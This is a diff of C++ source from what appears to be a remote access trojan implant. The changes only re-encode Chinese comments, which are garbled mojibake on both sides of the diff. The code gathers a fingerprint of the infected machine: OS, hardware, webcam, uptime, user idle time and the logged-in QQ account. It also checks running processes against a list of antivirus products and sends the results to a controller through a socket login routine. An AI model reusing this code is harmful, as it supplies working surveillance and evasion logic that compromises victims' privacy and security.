@@ -1,14 +1,14 @@
-#include "../stdafx.h"
-#include "../Declare.h"   //¶¯Ì¬µ÷ÓÃ¿âº¯Êı
+ï»¿#include "../stdafx.h"
+#include "../Declare.h"   //åŠ¨æ€è°ƒç”¨åº“å‡½æ•°
 #include <wininet.h>
 #include <vfw.h>
 #include "until.h"
 #include "decode.h"
-#include <iphlpapi.h> //ÍøÂçËÙÂÊÍ·
+#include <iphlpapi.h> //ç½‘ç»œé€Ÿç‡å¤´
 #pragma comment ( lib, "iphlpapi.lib" ) 
 #pragma comment(lib, "vfw32.lib")
-#include "../Myfunction.h"  //×Ô¶¨Òåº¯Êı
-/*************ÅĞ¶ÏÊÓÆµµÄÍ·ÎÄ¼ş*******************/
+#include "../Myfunction.h"  //è‡ªå®šä¹‰å‡½æ•°
+/*************åˆ¤æ–­è§†é¢‘çš„å¤´æ–‡ä»¶*******************/
 #include <strmif.h>
 #include <uuids.h>
 #pragma comment(lib, "strmiids.lib")
@@ -23,27 +23,27 @@ extern MODIFY_DATA modify_data;
 typedef struct
 {	
 	BYTE			bToken;			// = 1
-	OSVERSIONINFOEX	OsVerInfoEx;	// °æ±¾ĞÅÏ¢
-	DWORD			dwCPUClockMhz;	// CPUÆµÂÊ
-	int				nCPUNumber;		// CPUºËÊı
-	IN_ADDR			WanIPAddress;	// ´æ´¢32Î»µÄIPv4µÄµØÖ·Êı¾İ½á¹¹(ÍâÍø)
-	IN_ADDR			LanIPAddress;	// ´æ´¢32Î»µÄIPv4µÄµØÖ·Êı¾İ½á¹¹(ÄÚÍø)
-	char			HostName[256];	// Ö÷»úÃû
-	bool			bIsWebCam;		// ÊÇ·ñÓĞÉãÏñÍ·
-	DWORD			dwSpeed;		// ÍøËÙ
-	DWORD			Speed;		    // Íø¿¨
-	DWORD			MemSize;		// ÄÚ´æ´óĞ¡
-	DWORD			DriverSize;		// Ó²ÅÌÈİÁ¿
-	char			UpGroup[50];	// ÉÏÏß·Ö×é
-	char			RunTime[32];	// ÔËĞĞÊ±¼ä
-	char			szVersion[32];	// ÉÏÏß°æ±¾
+	OSVERSIONINFOEX	OsVerInfoEx;	// ç‰ˆæœ¬ä¿¡æ¯
+	DWORD			dwCPUClockMhz;	// CPUé¢‘ç‡
+	int				nCPUNumber;		// CPUæ ¸æ•°
+	IN_ADDR			WanIPAddress;	// å­˜å‚¨32ä½çš„IPv4çš„åœ°å€æ•°æ®ç»“æ„(å¤–ç½‘)
+	IN_ADDR			LanIPAddress;	// å­˜å‚¨32ä½çš„IPv4çš„åœ°å€æ•°æ®ç»“æ„(å†…ç½‘)
+	char			HostName[256];	// ä¸»æœºå
+	bool			bIsWebCam;		// æ˜¯å¦æœ‰æ‘„åƒå¤´
+	DWORD			dwSpeed;		// ç½‘é€Ÿ
+	DWORD			Speed;		    // ç½‘å¡
+	DWORD			MemSize;		// å†…å­˜å¤§å°
+	DWORD			DriverSize;		// ç¡¬ç›˜å®¹é‡
+	char			UpGroup[50];	// ä¸Šçº¿åˆ†ç»„
+	char			RunTime[32];	// è¿è¡Œæ—¶é—´
+	char			szVersion[32];	// ä¸Šçº¿ç‰ˆæœ¬
 	char            Virus[50];
-	BOOL            bIs64;          // 32Î»or 64Î» 1Îª64 0Îª32     
-	char			MarkTime[50];   // ·şÎñ¶Ë°²×°Ê±¼ä
-	CHAR szQQNum[256];     //µ±Ç°ÔËĞĞµÄQQºÅÂë
-	BOOL  bIsActive;	   //ÓÃ»§×´Ì¬
+	BOOL            bIs64;          // 32ä½or 64ä½ 1ä¸º64 0ä¸º32     
+	char			MarkTime[50];   // æœåŠ¡ç«¯å®‰è£…æ—¶é—´
+	CHAR szQQNum[256];     //å½“å‰è¿è¡Œçš„QQå·ç 
+	BOOL  bIsActive;	   //ç”¨æˆ·çŠ¶æ€
 	TCHAR sznet[20];       //net type
-	IN_ADDR	    	IPAddress;	// ´æ´¢32Î»µÄIPv4µÄµØÖ·Êı¾İ½á¹¹
+	IN_ADDR	    	IPAddress;	// å­˜å‚¨32ä½çš„IPv4çš„åœ°å€æ•°æ®ç»“æ„
 }LOGININFO;
 
 ///////////////////////////////////////////////////////////////////////////////////////////
@@ -66,31 +66,31 @@ DWORD CPUClockMhzT()
 	return	dwCPUMhz;
 }
 
-//Ã¶¾ÙÊÓÆµÉè±¸
+//æšä¸¾è§†é¢‘è®¾å¤‡
 //////////////////////////////////////////////////////////
 UINT EnumDevices()
 {
 	UINT nCam = 0;
-	CoInitialize(NULL);    //COM ¿â³õÊ¼»¯
+	CoInitialize(NULL);    //COM åº“åˆå§‹åŒ–
 	/////////////////////    Step1        /////////////////////////////////
-	//Ã¶¾Ù²¶»ñÉè±¸
-	ICreateDevEnum *pCreateDevEnum;                          //´´½¨Éè±¸Ã¶¾ÙÆ÷
-	//´´½¨Éè±¸Ã¶¾Ù¹ÜÀíÆ÷
-	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //Òª´´½¨µÄFilterµÄClass ID
-		NULL,                                                //±íÊ¾Filter²»±»¾ÛºÏ
-		CLSCTX_INPROC_SERVER,                                //´´½¨½ø³ÌÄÚCOM¶ÔÏó
-		IID_ICreateDevEnum,                                  //»ñµÃµÄ½Ó¿ÚID
-		(void**)&pCreateDevEnum);                            //´´½¨µÄ½Ó¿Ú¶ÔÏóµÄÖ¸Õë
+	//æšä¸¾æ•è·è®¾å¤‡
+	ICreateDevEnum *pCreateDevEnum;                          //åˆ›å»ºè®¾å¤‡æšä¸¾å™¨
+	//åˆ›å»ºè®¾å¤‡æšä¸¾ç®¡ç†å™¨
+	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //è¦åˆ›å»ºçš„Filterçš„Class ID
+		NULL,                                                //è¡¨ç¤ºFilterä¸è¢«èšåˆ
+		CLSCTX_INPROC_SERVER,                                //åˆ›å»ºè¿›ç¨‹å†…COMå¯¹è±¡
+		IID_ICreateDevEnum,                                  //è·å¾—çš„æ¥å£ID
+		(void**)&pCreateDevEnum);                            //åˆ›å»ºçš„æ¥å£å¯¹è±¡çš„æŒ‡é’ˆ
 	if (hr != NOERROR)
 	{
 		//	d(_T("CoCreateInstance Error"));
 		return FALSE;
 	}
 	/////////////////////    Step2        /////////////////////////////////
-	IEnumMoniker *pEm;                 //Ã¶¾Ù¼à¿ØÆ÷½Ó¿Ú
-	//»ñÈ¡ÊÓÆµÀàµÄÃ¶¾ÙÆ÷
+	IEnumMoniker *pEm;                 //æšä¸¾ç›‘æ§å™¨æ¥å£
+	//è·å–è§†é¢‘ç±»çš„æšä¸¾å™¨
 	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
-	//Èç¹ûÏë»ñÈ¡ÒôÆµÀàµÄÃ¶¾ÙÆ÷£¬ÔòÊ¹ÓÃÈçÏÂ´úÂë
+	//å¦‚æœæƒ³è·å–éŸ³é¢‘ç±»çš„æšä¸¾å™¨ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹ä»£ç 
 	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
 	if (hr != NOERROR)
 	{
@@ -98,30 +98,30 @@ UINT EnumDevices()
 		return FALSE;
 	}
 	/////////////////////    Step3        /////////////////////////////////
-	pEm->Reset();                                            //ÀàĞÍÃ¶¾ÙÆ÷¸´Î»
+	pEm->Reset();                                            //ç±»å‹æšä¸¾å™¨å¤ä½
 	ULONG cFetched;
-	IMoniker *pM;                                            //¼à¿ØÆ÷½Ó¿ÚÖ¸Õë
-	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //»ñÈ¡ÏÂÒ»¸öÉè±¸
+	IMoniker *pM;                                            //ç›‘æ§å™¨æ¥å£æŒ‡é’ˆ
+	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //è·å–ä¸‹ä¸€ä¸ªè®¾å¤‡
 	{
-		IPropertyBag *pBag;                                  //ÊôĞÔÒ³½Ó¿ÚÖ¸Õë
+		IPropertyBag *pBag;                                  //å±æ€§é¡µæ¥å£æŒ‡é’ˆ
 		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
-		//»ñÈ¡Éè±¸ÊôĞÔÒ³
+		//è·å–è®¾å¤‡å±æ€§é¡µ
 		if(SUCCEEDED(hr)) 
 		{
             VARIANT var;
-            var.vt = VT_BSTR;                                //±£´æµÄÊÇ¶ş½øÖÆÊı¾İ
+            var.vt = VT_BSTR;                                //ä¿å­˜çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®
             hr = pBag->Read(L"FriendlyName", &var, NULL);
-			//»ñÈ¡FriendlyNameĞÎÊ½µÄĞÅÏ¢
+			//è·å–FriendlyNameå½¢å¼çš„ä¿¡æ¯
             if (hr == NOERROR) 
             {
 				nCam++;
-				SysFreeString(var.bstrVal);   //ÊÍ·Å×ÊÔ´£¬ÌØ±ğÒª×¢Òâ
+				SysFreeString(var.bstrVal);   //é‡Šæ”¾èµ„æºï¼Œç‰¹åˆ«è¦æ³¨æ„
             }
-            pBag->Release();                  //ÊÍ·ÅÊôĞÔÒ³½Ó¿ÚÖ¸Õë
+            pBag->Release();                  //é‡Šæ”¾å±æ€§é¡µæ¥å£æŒ‡é’ˆ
         }
-        pM->Release();                        //ÊÍ·Å¼à¿ØÆ÷½Ó¿ÚÖ¸Õë
+        pM->Release();                        //é‡Šæ”¾ç›‘æ§å™¨æ¥å£æŒ‡é’ˆ
     }
-	CoUninitialize();                   //Ğ¶ÔØCOM¿â
+	CoUninitialize();                   //å¸è½½COMåº“
 	return nCam;
 }
 //////////////////////////////////////////////////////////
@@ -137,7 +137,7 @@ bool IsWebCam()
 	return bRet;
 }
 
-BOOL GetOSVerIs64Bit() //»ñÈ¡ÏµÍ³Æ½Ì¨
+BOOL GetOSVerIs64Bit() //è·å–ç³»ç»Ÿå¹³å°
 {
 	BOOL bRet=FALSE;
 	SYSTEM_INFO si;
@@ -156,7 +156,7 @@ BOOL GetOSVerIs64Bit() //»ñÈ¡ÏµÍ³Æ½Ì¨
 	return bRet;
 }
 
-int GetNetwork()//»ñÈ¡ÍøÂçËÙÂÊMbps 
+int GetNetwork()//è·å–ç½‘ç»œé€Ÿç‡Mbps 
 {
         DWORD dwSize = 0;
         DWORD dwRetVal = 0;
@@ -196,7 +196,7 @@ int GetNetwork()//»ñÈ¡ÍøÂçËÙÂÊMbps
         return dwspeed;
 }
 
-/////////////////É±¶¾ÏÔÊ¾//////////////////////////////////
+/////////////////æ€æ¯’æ˜¾ç¤º//////////////////////////////////
 typedef struct
 {
 	char *Course;
@@ -205,39 +205,39 @@ typedef struct
 
 AYSDFE g_Ayadfe_Datas[40] =
 {
-    {"360tray.exe",       "360ÎÀÊ¿"},
-    {"360sd.exe",         "360É±¶¾"},
-    {"kxetray.exe",       "½ğÉ½¶¾°Ô"},
-    {"KSafeTray.exe",     "½ğÉ½°²È«ÎÀÊ¿"},
-    {"QQPCRTP.exe",       "QQµçÄÔ¹Ü¼Ò"},
-    {"HipsTray.exe",      "»ğÈŞ"},
-    {"BaiduSd.exe",       "°Ù¶ÈÉ±¶¾"},
-    {"baiduSafeTray.exe", "°Ù¶ÈÎÀÊ¿"},
-    {"KvMonXP.exe",       "½­Ãñ"},
-    {"RavMonD.exe",       "ÈğĞÇ"},
-    {"QUHLPSVC.EXE",      "QuickHeal"},   //Ó¡¶È
-    {"mssecess.exe",      "Î¢ÈíMSE"},
-    {"cfp.exe",           "ComodoÉ±¶¾"},
-    {"SPIDer.exe",        "DR.WEB"},      //´óÖ©Öë
+    {"360tray.exe",       "360å«å£«"},
+    {"360sd.exe",         "360æ€æ¯’"},
+    {"kxetray.exe",       "é‡‘å±±æ¯’éœ¸"},
+    {"KSafeTray.exe",     "é‡‘å±±å®‰å…¨å«å£«"},
+    {"QQPCRTP.exe",       "QQç”µè„‘ç®¡å®¶"},
+    {"HipsTray.exe",      "ç«ç»’"},
+    {"BaiduSd.exe",       "ç™¾åº¦æ€æ¯’"},
+    {"baiduSafeTray.exe", "ç™¾åº¦å«å£«"},
+    {"KvMonXP.exe",       "æ±Ÿæ°‘"},
+    {"RavMonD.exe",       "ç‘æ˜Ÿ"},
+    {"QUHLPSVC.EXE",      "QuickHeal"},   //å°åº¦
+    {"mssecess.exe",      "å¾®è½¯MSE"},
+    {"cfp.exe",           "Comodoæ€æ¯’"},
+    {"SPIDer.exe",        "DR.WEB"},      //å¤§èœ˜è››
     {"acs.exe",           "Outpost"},
-    {"V3Svc.exe",         "°²²©Ê¿V3"},
-    {"AYAgent.aye",       "º«¹ú½ºÄÒ"},
+    {"V3Svc.exe",         "å®‰åšå£«V3"},
+    {"AYAgent.aye",       "éŸ©å›½èƒ¶å›Š"},
     {"avgwdsvc.exe",      "AVG"},
-    {"f-secure.exe",      "F-Secure"},    //·Ò°²È«
-    {"avp.exe",           "¿¨°Í"},
-    {"Mcshield.exe",      "Âó¿§·È"},
+    {"f-secure.exe",      "F-Secure"},    //èŠ¬å®‰å…¨
+    {"avp.exe",           "å¡å·´"},
+    {"Mcshield.exe",      "éº¦å’–å•¡"},
     {"egui.exe",          "NOD32"},
-    {"knsdtray.exe",      "¿ÉÅ£"},
-    {"TMBMSRV.exe",       "Ç÷ÊÆ"},
-    {"avcenter.exe",      "Ğ¡ºìÉ¡"},
-    {"ashDisp.exe",       "AvastÍøÂç°²È«"}, 
-    {"rtvscan.exe",       "Åµ¶Ù"}, 
-    {"remupd.exe",        "ĞÜÃ¨ÎÀÊ¿"},
+    {"knsdtray.exe",      "å¯ç‰›"},
+    {"TMBMSRV.exe",       "è¶‹åŠ¿"},
+    {"avcenter.exe",      "å°çº¢ä¼"},
+    {"ashDisp.exe",       "Avastç½‘ç»œå®‰å…¨"}, 
+    {"rtvscan.exe",       "è¯ºé¡¿"}, 
+    {"remupd.exe",        "ç†ŠçŒ«å«å£«"},
     {"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
-    {"PSafeSysTray.exe",  "PSafe·´²¡¶¾"}, //°ÍÎ÷
-    {"ad-watch.exe",      "Ad-watch·´¼äµı"}, 
-    {"K7TSecurity.exe",   "K7É±¶¾"}, 
-    {"UnThreat.exe",      "UnThreat"},    //±£¼ÓÀûÑÇ
+    {"PSafeSysTray.exe",  "PSafeåç—…æ¯’"}, //å·´è¥¿
+    {"ad-watch.exe",      "Ad-watchåé—´è°"}, 
+    {"K7TSecurity.exe",   "K7æ€æ¯’"}, 
+    {"UnThreat.exe",      "UnThreat"},    //ä¿åŠ åˆ©äºš
     {"Telegram.exe",      ""},
     {"  ",                "  "}
 };
@@ -252,7 +252,7 @@ char* GetVirus()
     memset(AllName, 0, sizeof(AllName));
     if (GetProcessID("Telegram.exe"))
     {
-        strcat(AllName, "·É»úÔÚÏß/ ");
+        strcat(AllName, "é£æœºåœ¨çº¿/ ");
         telegramExists = 1;
     }
     else
@@ -330,7 +330,7 @@ UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
 	ReadRegExg(lpServiceName ,JYvni04 ,lpBuffer, uSize);
 	if (lstrlen(lpBuffer) == 0)
 	{
-		pMyfunction->my_strcpy(lpBuffer,"ÎŞĞÅÏ¢");
+		pMyfunction->my_strcpy(lpBuffer,"æ— ä¿¡æ¯");
 	}
 	return lstrlen(lpBuffer);
 }
@@ -437,28 +437,28 @@ TCHAR *ConnectionKind()
 	{
 		if ((flags & INTERNET_CONNECTION_MODEM) == INTERNET_CONNECTION_MODEM)
 		{
-			return _T("MODEM Á¬½Ó");
+			return _T("MODEM è¿æ¥");
 		}
 		else if ((flags & INTERNET_CONNECTION_LAN) == INTERNET_CONNECTION_LAN)
 		{
-			return _T("LAN Á¬½Ó");
+			return _T("LAN è¿æ¥");
 		}
 		else if ((flags & INTERNET_CONNECTION_PROXY) == INTERNET_CONNECTION_PROXY)
 		{
-			return _T("PROXY Á¬½Ó");
+			return _T("PROXY è¿æ¥");
 		} else if ((flags & INTERNET_CONNECTION_MODEM_BUSY) == INTERNET_CONNECTION_MODEM_BUSY)
 		{
-			return _T("BUSY Á¬½Ó");
+			return _T("BUSY è¿æ¥");
 		}
 		else
-			return _T("OTHER Á¬½Ó");
+			return _T("OTHER è¿æ¥");
 	}
 }
 
 /////////////////
 
 /////////////////
-void clean_string(char *str)//È¥Ê×Î²¿Õ¸ñ
+void clean_string(char *str)//å»é¦–å°¾ç©ºæ ¼
 {
 	char *start = str - 1;
 	char *end = str;
@@ -480,12 +480,12 @@ void clean_string(char *str)//È¥Ê×Î²¿Õ¸ñ
 		}
 		++p;
 	}
-	//ÏÖÔÚÀ´µ½ÁË×Ö·û´®µÄÎ²²¿ ·´ÏòÏòÇ°
+	//ç°åœ¨æ¥åˆ°äº†å­—ç¬¦ä¸²çš„å°¾éƒ¨ åå‘å‘å‰
 	--p;
 	++start;
 	if(*start == 0)
 	{
-		//ÒÑ¾­µ½×Ö·û´®µÄÄ©Î²ÁË 
+		//å·²ç»åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾äº† 
 		*str = 0 ;
 		return;
 	}
@@ -545,21 +545,21 @@ char * GetQQ()
 int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szVersion)
 {
 	int nRet = SOCKET_ERROR;
-	// µÇÂ¼ĞÅÏ¢
+	// ç™»å½•ä¿¡æ¯
 	LOGININFO	LoginInfo;
 	memset(&LoginInfo,0,sizeof(LoginInfo));
-	// ¿ªÊ¼¹¹ÔìÊı¾İ
-	LoginInfo.bToken = TOKEN_LOGIN; // ÁîÅÆÎªµÇÂ¼
-	LoginInfo.bIsWebCam = 0;        // Ã»ÓĞÉãÏñÍ·
+	// å¼€å§‹æ„é€ æ•°æ®
+	LoginInfo.bToken = TOKEN_LOGIN; // ä»¤ç‰Œä¸ºç™»å½•
+	LoginInfo.bIsWebCam = 0;        // æ²¡æœ‰æ‘„åƒå¤´
 	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ×¢Òâ×ª»»ÀàĞÍ
+	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // æ³¨æ„è½¬æ¢ç±»å‹
 	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
 	
-	// Ö÷»úÃû
+	// ä¸»æœºå
 	char hostname[256];
 	GetHostRemark(hostname, sizeof(hostname));
 	
-	// Á¬½ÓµÄIPµØÖ·
+	// è¿æ¥çš„IPåœ°å€
 	sockaddr_in  sockAddr;
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
@@ -570,18 +570,18 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,
 	pMyfunction->my_memcpy(&LoginInfo.HostName, hostname, sizeof(hostname));
 	// CPU
 	LoginInfo.dwCPUClockMhz = CPUClockMhzT();
-	SYSTEM_INFO SysInfo; // ÓÃÓÚ»ñÈ¡CPU¸öÊıµÄ
+	SYSTEM_INFO SysInfo; // ç”¨äºè·å–CPUä¸ªæ•°çš„
 	GetSystemInfo(&SysInfo);
 	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
 	
-	// ÄÚ´æ´óĞ¡
-    MEMORYSTATUSEX	MemInfo; // ÓÃGlobalMemoryStatusEx¿ÉÏÔÊ¾2GÒÔÉÏÄÚ´æ
+	// å†…å­˜å¤§å°
+    MEMORYSTATUSEX	MemInfo; // ç”¨GlobalMemoryStatusExå¯æ˜¾ç¤º2Gä»¥ä¸Šå†…å­˜
     MemInfo.dwLength=sizeof(MemInfo); 
     GlobalMemoryStatusEx(&MemInfo);
 	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
 	LoginInfo.MemSize = (unsigned long)strMem;
 
-	// Ó²ÅÌ¿Õ¼ä
+	// ç¡¬ç›˜ç©ºé—´
 	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
 	unsigned long nAllGB = 0, nFreeGB = 0;
     DWORD drivertype;
@@ -597,30 +597,30 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,
 			continue;
 		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
 		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
-//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //Ê£Óà´ÅÅÌ
+//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //å‰©ä½™ç£ç›˜
     }
-	// Ó²ÅÌ
+	// ç¡¬ç›˜
 	LoginInfo.DriverSize = nAllGB;
 
-	// ÉãÏñÍ·
+	// æ‘„åƒå¤´
 	LoginInfo.bIsWebCam = IsWebCam();
 	
 	// Speed
 	LoginInfo.dwSpeed = dwSpeed;
 
-	// Íø¿¨
+	// ç½‘å¡
 	LoginInfo.Speed = GetNetwork();
 
-	// ·şÎñ°²×°Ê±¼ä
+	// æœåŠ¡å®‰è£…æ—¶é—´
 	GetMarkTime(modify_data.SerName, LoginInfo.MarkTime, sizeof(LoginInfo.MarkTime));
 	
 	// 32 or 64
 	LoginInfo.bIs64 = GetOSVerIs64Bit();
 
-	// É±¶¾Èí¼ş
+	// æ€æ¯’è½¯ä»¶
     strcpy( LoginInfo.Virus, GetVirus() );
 
-	// »î¶¯Ê±¼ä
+	// æ´»åŠ¨æ—¶é—´
 	char jsbHj10[] = {'%','d','\0'};
 	DWORD t=GetTickCount();
 	char day[100];
@@ -631,16 +631,16 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,
 	wsprintfA(hour,jsbHj10, t/3600000);
 	t%=3600000;
 	wsprintfA(min, jsbHj10, t/60000);
-	wsprintfA(LoginInfo.RunTime, "%sÌì%sÊ±%s·Ö", day, hour,min);
+	wsprintfA(LoginInfo.RunTime, "%så¤©%sæ—¶%såˆ†", day, hour,min);
 
-    // ÉÏÏß°æ±¾
+    // ä¸Šçº¿ç‰ˆæœ¬
 
 	char *szVerTemp = MyDecode(szVersion);
 		
 	strcpy(LoginInfo.szVersion, szVerTemp);
 	free(szVerTemp);
 
-	// ÉÏÏß·Ö×é
+	// ä¸Šçº¿åˆ†ç»„
 	char *UpRow = NULL;
 	bool bFree = false;
 	char Group[256];
@@ -665,18 +665,18 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,
 	strcpy(LoginInfo.UpGroup,UpRow);
 	if (bFree) free(UpRow);
 	
-	// »ñÈ¡Qq
+	// è·å–Qq
 	lstrcpy(LoginInfo.szQQNum,GetQQ());
 
-	// ÓÃ»§×´Ì¬
+	// ç”¨æˆ·çŠ¶æ€
 	LoginInfo.bIsActive = false;
-	//ÊÇ·ñ»î¶¯
+	//æ˜¯å¦æ´»åŠ¨
 	LASTINPUTINFO lpi;
 	lpi.cbSize = sizeof(lpi);
-	GetLastInputInfo(&lpi);//»ñÈ¡ÉÏ´ÎÊäÈë²Ù×÷µÄÊ±¼ä¡£
-	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5·ÖÖÓ
+	GetLastInputInfo(&lpi);//è·å–ä¸Šæ¬¡è¾“å…¥æ“ä½œçš„æ—¶é—´ã€‚
+	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5åˆ†é’Ÿ
 	{
-		//µ±Ç°ÏµÍ³ÒÑ¾­¿ÕÏĞÁË1·ÖÖÓ
+		//å½“å‰ç³»ç»Ÿå·²ç»ç©ºé—²äº†1åˆ†é’Ÿ
 		LoginInfo.bIsActive = true;
 	}
 
